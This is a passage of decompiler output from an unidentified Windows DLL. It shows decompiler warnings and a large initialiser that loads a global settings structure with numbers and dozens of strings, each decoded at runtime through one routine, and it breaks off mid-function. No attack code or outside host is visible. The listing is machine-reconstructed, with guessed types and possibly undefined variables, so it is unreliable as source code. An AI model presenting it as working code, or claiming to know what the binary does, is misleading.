// 10002A5F: variable 'v110' is possibly undefined
// 10002A88: variable 'v109' is possibly undefined
// 10002AA6: variable 'v112' is possibly undefined
// 10002AF4: variable 'v113' is possibly undefined
// 10002B0A: variable 'v114' is possibly undefined
// 10002C10: variable 'v120' is possibly undefined
// 10002C39: variable 'v119' is possibly undefined
// 10002C58: variable 'v122' is possibly undefined
// 10002CA7: variable 'v123' is possibly undefined
// 10002CBD: variable 'v124' is possibly undefined
// 10002D00: variable 'v126' is possibly undefined
// 10002D49: variable 'v127' is possibly undefined
// 10002D5F: variable 'v128' is possibly undefined
// 10183460: using guessed type int dword_10183460;
// 10183468: using guessed type _DWORD dword_10183468[2];
// 10183470: using guessed type _DWORD dword_10183470[2];
// 10183478: using guessed type _DWORD dword_10183478[2];
// 10183480: using guessed type _DWORD dword_10183480[2];
// 10183488: using guessed type _DWORD dword_10183488[2];
// 10183490: using guessed type _DWORD dword_10183490[3];
// 1018349C: using guessed type _DWORD dword_1018349C[4];
// 101834AC: using guessed type _DWORD dword_101834AC[4];
// 101834BC: using guessed type _DWORD dword_101834BC[4];
// 101834CC: using guessed type _DWORD dword_101834CC[4];
// 101834DC: using guessed type _DWORD dword_101834DC[4];
// 101834EC: using guessed type _DWORD dword_101834EC[4];
// 10183502: using guessed type _DWORD dword_10183502[4];
// 10183516: using guessed type _DWORD dword_10183516[4];
// 10183526: using guessed type _DWORD dword_10183526[4];
// 10183543: using guessed type _DWORD dword_10183543[4];
// 10183553: using guessed type _BYTE byte_10183553[25];
// 1018356C: using guessed type _DWORD dword_1018356C[4];
// 1018357C: using guessed type _DWORD dword_1018357C[4];
// 101835A1: using guessed type _DWORD dword_101835A1[4];
// 101835BE: using guessed type _DWORD dword_101835BE[4];
// 101835D7: using guessed type _DWORD dword_101835D7[4];
// 101842F4: using guessed type int dword_101842F4;
// 10193B34: using guessed type int dword_10193B34;
// 100016E6: using guessed type int var_A8[5];
// 100016E6: using guessed type LONG var_88[2];

//----- (10002F79) --------------------------------------------------------
void __stdcall sub_10002F79(int *a1)
{
  sub_100068A5((int *)((char *)a1 + 375));
  sub_100068A5((int *)((char *)a1 + 350));
  sub_100068A5((int *)((char *)a1 + 321));
  sub_100068A5(a1 + 71);
  sub_100068A5(a1 + 67);
  sub_100068A5((int *)((char *)a1 + 227));
  sub_100068A5((int *)((char *)a1 + 198));
  sub_10006DC3((int *)((char *)a1 + 182));
  sub_100068A5((int *)((char *)a1 + 162));
  sub_100068A5(a1 + 35);
  sub_100068A5(a1 + 31);
  sub_100068A5(a1 + 27);
  sub_100068A5(a1 + 23);
  sub_100068A5(a1 + 19);
  sub_100068A5(a1 + 15);
  sub_1000D3AD(a1 + 10);
  sub_1000D3AD(a1 + 6);
  sub_1000D3AD(a1 + 2);
}

//----- (1000308F) --------------------------------------------------------
void __stdcall sub_1000308F(int a1)
{
  sub_1000780D((void *)(a1 + 16));
  sub_1000D3AD((int *)(a1 + 8));
}

//----- (100030C4) --------------------------------------------------------
void __thiscall sub_100030C4(_DWORD *this)
{
  sub_1000D17D(this, &word_1017DB80);
  sub_1000D17D(this + 2, &word_1017DB80);
  sub_10006814(this + 4);
}

//----- (10003111) --------------------------------------------------------
void __thiscall sub_10003111(int *this)
{
  sub_100068A5(this + 4);
  sub_1000D3AD(this + 2);
  sub_1000D3AD(this);
}

//----- (10003155) --------------------------------------------------------
void sub_10003155()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v3; // eax
  wchar_t *v4; // eax
  _DWORD *v5; // eax
  int v6; // eax
  int v7; // eax
  wchar_t *v8; // eax
  wchar_t *v9; // eax
  wchar_t *v10; // eax
  wchar_t *v11; // eax
  wchar_t *v12; // eax
  wchar_t *v13; // eax
  wchar_t *v14; // eax
  wchar_t *v15; // eax
  wchar_t *v16; // eax
  wchar_t *v17; // eax
  wchar_t *v18; // eax
  wchar_t *v19; // eax
  wchar_t *v20; // eax
  wchar_t *v21; // eax
  wchar_t *v22; // eax
  wchar_t *v23; // eax
  wchar_t *v24; // eax
  wchar_t *v25; // eax
  wchar_t *v26; // eax
  wchar_t *v27; // eax
  wchar_t *v28; // eax
  wchar_t *v29; // eax
  wchar_t *v30; // eax
  int v31; // eax
  wchar_t *v32; // eax
  wchar_t *v33; // eax
  wchar_t *v34; // eax
  wchar_t *v35; // eax
  wchar_t *v36; // eax
  wchar_t *v37; // eax
  wchar_t *v38; // eax
  wchar_t *v39; // eax
  wchar_t *v40; // eax
  _BYTE *v41; // eax
  wchar_t *v42; // eax
  wchar_t *v43; // eax
  wchar_t *v44; // eax
  wchar_t *v45; // eax
  wchar_t *v46; // eax
  wchar_t *v47; // eax
  wchar_t *v48; // eax
  wchar_t *v49; // eax
  wchar_t *v50; // eax
  wchar_t *v51; // eax
  wchar_t *v52; // eax
  wchar_t *v53; // eax
  wchar_t *v54; // eax
  wchar_t *v55; // eax
  int v56; // ecx
  _BYTE *v57; // edi
  int v58; // eax
  wchar_t *v59; // eax
  wchar_t *v60; // eax
  wchar_t *v61; // eax
  wchar_t *v62; // eax
  wchar_t *v63; // eax
  wchar_t *v64; // eax
  wchar_t *v65; // eax
  wchar_t *v66; // eax
  wchar_t *v67; // eax
  wchar_t *v68; // eax
  wchar_t *v69; // eax
  wchar_t *v70; // eax
  wchar_t *v71; // eax
  _BYTE *v72; // eax
  int v73; // ecx
  wchar_t *v74; // eax
  wchar_t *v75; // eax
  wchar_t *v76; // eax
  wchar_t *v77; // eax
  wchar_t *v78; // eax
  wchar_t *v79; // eax
  wchar_t *v80; // eax
  wchar_t *v81; // eax
  wchar_t *v82; // eax
  wchar_t *v83; // eax
  wchar_t *v84; // eax
  wchar_t *v85; // eax
  wchar_t *v86; // eax
  wchar_t *v87; // eax
  wchar_t *v88; // eax
  wchar_t *v89; // eax
  wchar_t *v90; // eax
  wchar_t *v91; // eax
  wchar_t *v92; // eax
  wchar_t *v93; // eax
  wchar_t *v94; // eax
  wchar_t *v95; // eax
  wchar_t *v96; // eax
  wchar_t *v97; // eax
  wchar_t *v98; // eax
  wchar_t *v99; // eax
  wchar_t *v100; // eax
  wchar_t *v101; // eax
  wchar_t *v102; // eax
  wchar_t *v103; // eax
  wchar_t *v104; // eax
  wchar_t *v105; // eax
  wchar_t *v106; // eax
  wchar_t *v107; // eax
  wchar_t *v108; // eax
  wchar_t *v109; // eax
  wchar_t *v110; // eax
  wchar_t *v111; // eax
  wchar_t *v112; // eax
  wchar_t *v113; // eax
  wchar_t *v114; // eax
  wchar_t *v115; // eax
  wchar_t *v116; // eax
  wchar_t *v117; // eax
  int v118; // eax
  int v119; // [esp+170h] [ebp-4Ch] BYREF
  LONG v120[2]; // [esp+174h] [ebp-48h] BYREF
  int v121; // [esp+17Ch] [ebp-40h]
  _BYTE v122[9]; // [esp+180h] [ebp-3Ch]
  int v123; // [esp+18Ch] [ebp-30h] BYREF
  LONG v124[2]; // [esp+190h] [ebp-2Ch] BYREF
  LONG v125; // [esp+198h] [ebp-24h] BYREF
  int v126[5]; // [esp+19Ch] [ebp-20h] BYREF
  int v127; // [esp+1B8h] [ebp-4h]

  if ( (dword_10193B2C & 1) == 0 )
  {
    dword_10193B2C |= 1u;
    dword_101832B0 = 0;
    dword_101832B4 = 0;
    sub_1000D17D(dword_101832B8, &word_1017C174);
    dword_101832C0 = 0;
    *(&dword_101832C0 + 1) = 0;
    sub_1000D17D(dword_101832C8, &word_1017C170);
    dword_101832D0[0] = 0;
    dword_101832D0[1] = 0;
    sub_1000D17D(dword_101832D8, &word_1017C16C);
    dword_101832E0[0] = 0;
    dword_101832E0[1] = 0;
    dword_101832E0[2] = 0;
    sub_10006814(dword_101832EC);
    sub_10006814(dword_101832FC);
    sub_10006814(dword_1018330C);
    sub_10006814(dword_1018331C);
    sub_10006814(dword_1018332C);
    sub_10006814(dword_1018333C);
    unk_1018334C = 0;
    *((_WORD *)&unk_1018334C + 2) = 0;
    sub_10006814(dword_10183352);
    unk_10183362 = 0;
    sub_10006D46(dword_10183366);
    sub_10006814(dword_10183376);
    unk_10183386 = 0;
    *((_DWORD *)&unk_10183386 + 1) = 0;
    *((_DWORD *)&unk_10183386 + 2) = 0;
    *((_BYTE *)&unk_10183386 + 12) = 0;
    sub_10006814(dword_10183393);
    memset(byte_101833A3, 0, 0x18u);
    byte_101833A3[24] = 0;
    sub_10006814(dword_101833BC);
    sub_10006814(dword_101833CC);
    unk_101833DC = 0;
    *((_DWORD *)&unk_101833DC + 1) = 0;
    *((_DWORD *)&unk_101833DC + 2) = 0;
    *((_DWORD *)&unk_101833DC + 3) = 0;
    *((_DWORD *)&unk_101833DC + 4) = 0;
    *((_BYTE *)&unk_101833DC + 20) = 0;
    sub_10006814(dword_101833F1);
    unk_10183401 = 0;
    *((_DWORD *)&unk_10183401 + 1) = 0;
    *((_DWORD *)&unk_10183401 + 2) = 0;
    *((_BYTE *)&unk_10183401 + 12) = 0;
    sub_10006814(dword_1018340E);
    unk_1018341E = 0;
    *((_DWORD *)&unk_1018341E + 1) = 0;
    *((_BYTE *)&unk_1018341E + 8) = 0;
    sub_10006814(dword_10183427);
    atexit(sub_100F3335);
    v127 = -1;
  }
  dword_101842F4 = (int)&dword_101832B0;
  dword_101832B0 = 1001;
  dword_101832B4 = 3600;
  dword_101832C0 = 2000000;
  dword_101832C4 = 4;
  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017C178);
  v1 = sub_1000D17D(&v119, v0);
  v127 = 19;
  v2 = sub_1000E111((int)v1);
  sub_10001236((LONG *)(v2 + 4), (LONG *)(dword_101842F4 + 28));
  v127 = -1;
  sub_1000D3AD(&v119);
  v3 = dword_101842F4;
  *(_DWORD *)(dword_101842F4 + 32) = 10000000;
  *(_DWORD *)(v3 + 36) = 15;
  v4 = (wchar_t *)sub_1000CC40((int)&unk_1017C1C8);
  v5 = sub_1000D17D(&v119, v4);
  v127 = 20;
  v6 = sub_1000E111((int)v5);
  sub_10001236((LONG *)(v6 + 4), (LONG *)(dword_101842F4 + 44));
  v127 = -1;
  sub_1000D3AD(&v119);
  v7 = dword_101842F4;
  *(_DWORD *)(dword_101842F4 + 156) = 0;
  *(_DWORD *)(v7 + 48) = 20;
  *(_DWORD *)(v7 + 337) = 30;
  *(_DWORD *)(v7 + 52) = 1;
  *(_BYTE *)(v7 + 160) = 1;
  *(_BYTE *)(v7 + 161) = 1;
  *(_DWORD *)(v7 + 56) = 2;
  (*(void (__thiscall **)(int))(*(_DWORD *)(v7 + 60) + 52))(v7 + 60);
  v8 = (wchar_t *)sub_1000CC40((int)&unk_1017C214);
  sub_1000D17D(&v119, v8);
  v127 = 21;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v9 = (wchar_t *)sub_1000CC40((int)&unk_1017C244);
  sub_1000D17D(&v119, v9);
  v127 = 22;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v10 = (wchar_t *)sub_1000CC40((int)&unk_1017C274);
  sub_1000D17D(&v119, v10);
  v127 = 23;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v11 = (wchar_t *)sub_1000CC40((int)&unk_1017C2A4);
  sub_1000D17D(&v119, v11);
  v127 = 24;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v12 = (wchar_t *)sub_1000CC40((int)&unk_1017C2D4);
  sub_1000D17D(&v119, v12);
  v127 = 25;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v13 = (wchar_t *)sub_1000CC40((int)&unk_1017C304);
  sub_1000D17D(&v119, v13);
  v127 = 26;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v14 = (wchar_t *)sub_1000CC40((int)&unk_1017C334);
  sub_1000D17D(&v119, v14);
  v127 = 27;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v15 = (wchar_t *)sub_1000CC40((int)&unk_1017C364);
  sub_1000D17D(&v119, v15);
  v127 = 28;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v16 = (wchar_t *)sub_1000CC40((int)&unk_1017C394);
  sub_1000D17D(&v119, v16);
  v127 = 29;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v17 = (wchar_t *)sub_1000CC40((int)&unk_1017C3C4);
  sub_1000D17D(&v119, v17);
  v127 = 30;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v18 = (wchar_t *)sub_1000CC40((int)&unk_1017C3F4);
  sub_1000D17D(&v119, v18);
  v127 = 31;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v19 = (wchar_t *)sub_1000CC40((int)&unk_1017C424);
  sub_1000D17D(&v119, v19);
  v127 = 32;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v20 = (wchar_t *)sub_1000CC40((int)&unk_1017C458);
  sub_1000D17D(&v119, v20);
  v127 = 33;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v21 = (wchar_t *)sub_1000CC40((int)&unk_1017C488);
  sub_1000D17D(&v119, v21);
  v127 = 34;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v22 = (wchar_t *)sub_1000CC40((int)&unk_1017C4B8);
  sub_1000D17D(&v119, v22);
  v127 = 35;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v23 = (wchar_t *)sub_1000CC40((int)&unk_1017C4E8);
  sub_1000D17D(&v119, v23);
  v127 = 36;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v24 = (wchar_t *)sub_1000CC40((int)&unk_1017C51C);
  sub_1000D17D(&v119, v24);
  v127 = 37;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v25 = (wchar_t *)sub_1000CC40((int)&unk_1017C550);
  sub_1000D17D(&v119, v25);
  v127 = 38;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v26 = (wchar_t *)sub_1000CC40((int)&unk_1017C584);
  sub_1000D17D(&v119, v26);
  v127 = 39;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v27 = (wchar_t *)sub_1000CC40((int)&unk_1017C5B8);
  sub_1000D17D(&v119, v27);
  v127 = 40;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v28 = (wchar_t *)sub_1000CC40((int)&unk_1017C5E8);
  sub_1000D17D(&v119, v28);
  v127 = 41;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v29 = (wchar_t *)sub_1000CC40((int)&unk_1017C618);
  sub_1000D17D(&v119, v29);
  v127 = 42;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v30 = (wchar_t *)sub_1000CC40((int)&unk_1017C64C);
  sub_1000D17D(&v119, v30);
  v127 = 43;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 162) + 36))(dword_101842F4 + 162, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v31 = dword_101842F4;
  *(_DWORD *)(dword_101842F4 + 214) = 5;
  *(_DWORD *)(v31 + 218) = 10;
  v32 = (wchar_t *)sub_1000CC40((int)&unk_1017C67C);
  sub_1000D17D(&v119, v32);
  v127 = 44;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 76) + 36))(dword_101842F4 + 76, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v33 = (wchar_t *)sub_1000CC40((int)&unk_1017C6B4);
  sub_1000D17D(&v119, v33);
  v127 = 45;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 76) + 36))(dword_101842F4 + 76, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v34 = (wchar_t *)sub_1000CC40((int)&unk_1017C6EC);
  sub_1000D17D(&v119, v34);
  v127 = 46;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 76) + 36))(dword_101842F4 + 76, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v35 = (wchar_t *)sub_1000CC40((int)&unk_1017C720);
  sub_1000D17D(&v119, v35);
  v127 = 47;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 76) + 36))(dword_101842F4 + 76, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v36 = (wchar_t *)sub_1000CC40((int)&unk_1017C768);
  sub_1000D17D(&v119, v36);
  v127 = 48;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 76) + 36))(dword_101842F4 + 76, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v37 = (wchar_t *)sub_1000CC40((int)&unk_1017C7AC);
  sub_1000D17D(&v119, v37);
  v127 = 49;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 76) + 36))(dword_101842F4 + 76, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v38 = (wchar_t *)sub_1000CC40((int)&unk_1017C7DC);
  sub_1000D17D(&v119, v38);
  v127 = 50;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 76) + 36))(dword_101842F4 + 76, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v39 = (wchar_t *)sub_1000CC40((int)&unk_1017C810);
  sub_1000D17D(&v119, v39);
  v127 = 51;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 76) + 36))(dword_101842F4 + 76, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v40 = (wchar_t *)sub_1000CC40((int)&unk_1017C83C);
  sub_1000D17D(&v119, v40);
  v127 = 52;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 76) + 36))(dword_101842F4 + 76, &v119);
  v127 = -1;
  sub_1000D3AD(&v119);
  v41 = (_BYTE *)dword_101842F4;
  *(_BYTE *)(dword_101842F4 + 222) = 1;
  v41[223] = 0;
  v41[224] = 1;
  v41[225] = 0;
  v41[226] = 1;
  sub_100030C4(&v123);
  v127 = 53;
  v42 = (wchar_t *)sub_1000CC40((int)&unk_1017C8A8);
  sub_1000D17D(&v119, v42);
  LOBYTE(v127) = 54;
  sub_10001236(v120, v124);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v43 = (wchar_t *)sub_1000CC40((int)&unk_1017C950);
  sub_1000D17D(&v119, v43);
  LOBYTE(v127) = 55;
  sub_10001236(v120, &v125);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  sub_10006A7D(v126);
  v44 = (wchar_t *)sub_1000CC40((int)&unk_1017C9C0);
  sub_1000D17D(&v119, v44);
  LOBYTE(v127) = 56;
  sub_10007469(v126, (int)&v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v45 = (wchar_t *)sub_1000CC40((int)&unk_1017C9F0);
  sub_1000D17D(&v119, v45);
  LOBYTE(v127) = 57;
  sub_10007469(v126, (int)&v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v46 = (wchar_t *)sub_1000CC40((int)&unk_1017CA20);
  sub_1000D17D(&v119, v46);
  LOBYTE(v127) = 58;
  sub_10007469(v126, (int)&v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 182) + 36))(dword_101842F4 + 182, &v123);
  v47 = (wchar_t *)sub_1000CC40((int)&unk_1017CA50);
  sub_1000D17D(&v119, v47);
  LOBYTE(v127) = 59;
  sub_10001236(v120, v124);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v48 = (wchar_t *)sub_1000CC40((int)&unk_1017CAF8);
  sub_1000D17D(&v119, v48);
  LOBYTE(v127) = 60;
  sub_10001236(v120, &v125);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  sub_10006A7D(v126);
  v49 = (wchar_t *)sub_1000CC40((int)&unk_1017CB5C);
  sub_1000D17D(&v119, v49);
  LOBYTE(v127) = 61;
  sub_10007469(v126, (int)&v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 182) + 36))(dword_101842F4 + 182, &v123);
  v50 = (wchar_t *)sub_1000CC40((int)&unk_1017CBC0);
  sub_1000D17D(&v119, v50);
  LOBYTE(v127) = 62;
  sub_10001236(v120, v124);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v51 = (wchar_t *)sub_1000CC40((int)&unk_1017CC68);
  sub_1000D17D(&v119, v51);
  LOBYTE(v127) = 63;
  sub_10001236(v120, &v125);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  sub_10006A7D(v126);
  v52 = (wchar_t *)sub_1000CC40((int)&unk_1017CCE4);
  sub_1000D17D(&v119, v52);
  LOBYTE(v127) = 64;
  sub_10007469(v126, (int)&v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 182) + 36))(dword_101842F4 + 182, &v123);
  v53 = (wchar_t *)sub_1000CC40((int)&unk_1017CD48);
  sub_1000D17D(&v119, v53);
  LOBYTE(v127) = 65;
  sub_10001236(v120, v124);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v54 = (wchar_t *)sub_1000CC40((int)&unk_1017CDF0);
  sub_1000D17D(&v119, v54);
  LOBYTE(v127) = 66;
  sub_10001236(v120, &v125);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  sub_10006A7D(v126);
  v55 = (wchar_t *)sub_1000CC40((int)&unk_1017CE54);
  sub_1000D17D(&v119, v55);
  LOBYTE(v127) = 67;
  sub_10007469(v126, (int)&v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 182) + 36))(dword_101842F4 + 182, &v123);
  v56 = dword_101842F4;
  v122[0] = 1;
  v121 = 0;
  *(_DWORD *)&v122[1] = 30;
  *(_DWORD *)&v122[5] = 50000;
  v120[1] = 500;
  *(_DWORD *)(dword_101842F4 + 243) = 500;
  *(_DWORD *)(v56 + 247) = v121;
  *(_DWORD *)(v56 + 251) = *(_DWORD *)v122;
  *(_DWORD *)(v56 + 255) = *(_DWORD *)&v122[4];
  v57 = (_BYTE *)(v56 + 259);
  *(_BYTE *)(v56 + 367) = 0;
  *(_BYTE *)(v56 + 368) = 1;
  *(_BYTE *)(v56 + 369) = 1;
  *(_BYTE *)(v56 + 370) = 1;
  *(_BYTE *)(v56 + 371) = 1;
  *(_BYTE *)(v56 + 372) = 1;
  *(_BYTE *)(v56 + 373) = 1;
  *(_BYTE *)(v56 + 374) = 1;
  *(_DWORD *)(v56 + 260) = 100000;
  *(_DWORD *)(v56 + 264) = 5000000;
  v56 += 268;
  v58 = *(_DWORD *)v56;
  *v57 = v122[8];
  (*(void (__thiscall **)(int))(v58 + 52))(v56);
  (*(void (__thiscall **)(int))(*(_DWORD *)(dword_101842F4 + 284) + 52))(dword_101842F4 + 284);
  v59 = (wchar_t *)sub_1000CC40((int)&unk_1017C874);
  sub_1000D17D(&v119, v59);
  LOBYTE(v127) = 68;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 284) + 36))(dword_101842F4 + 284, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v60 = (wchar_t *)sub_1000CC40((int)&unk_1017C91C);
  sub_1000D17D(&v119, v60);
  LOBYTE(v127) = 69;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 284) + 36))(dword_101842F4 + 284, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v61 = (wchar_t *)sub_1000CC40((int)&unk_1017CAC4);
  sub_1000D17D(&v119, v61);
  LOBYTE(v127) = 70;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 284) + 36))(dword_101842F4 + 284, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v62 = (wchar_t *)sub_1000CC40((int)&unk_1017CE84);
  sub_1000D17D(&v119, v62);
  LOBYTE(v127) = 71;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 375) + 36))(dword_101842F4 + 375, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v63 = (wchar_t *)sub_1000CC40((int)&unk_1017CEB4);
  sub_1000D17D(&v119, v63);
  LOBYTE(v127) = 72;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 375) + 36))(dword_101842F4 + 375, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v64 = (wchar_t *)sub_1000CC40((int)&unk_1017CEE4);
  sub_1000D17D(&v119, v64);
  LOBYTE(v127) = 73;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 375) + 36))(dword_101842F4 + 375, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v65 = (wchar_t *)sub_1000CC40((int)&unk_1017CF14);
  sub_1000D17D(&v119, v65);
  LOBYTE(v127) = 74;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 375) + 36))(dword_101842F4 + 375, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v66 = (wchar_t *)sub_1000CC40((int)&unk_1017CF44);
  sub_1000D17D(&v119, v66);
  LOBYTE(v127) = 75;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 375) + 36))(dword_101842F4 + 375, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v67 = (wchar_t *)sub_1000CC40((int)&unk_1017CB8C);
  sub_1000D17D(&v119, v67);
  LOBYTE(v127) = 76;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 375) + 36))(dword_101842F4 + 375, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v68 = (wchar_t *)sub_1000CC40((int)&unk_1017CC34);
  sub_1000D17D(&v119, v68);
  LOBYTE(v127) = 77;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 375) + 36))(dword_101842F4 + 375, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v69 = (wchar_t *)sub_1000CC40((int)&unk_1017CD14);
  sub_1000D17D(&v119, v69);
  LOBYTE(v127) = 78;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 375) + 36))(dword_101842F4 + 375, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v70 = (wchar_t *)sub_1000CC40((int)&unk_1017CDBC);
  sub_1000D17D(&v119, v70);
  LOBYTE(v127) = 79;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 375) + 36))(dword_101842F4 + 375, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v71 = (wchar_t *)sub_1000CC40((int)&unk_1017CF74);
  sub_1000D17D(&v119, v71);
  LOBYTE(v127) = 80;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 92) + 36))(dword_101842F4 + 92, &v119);
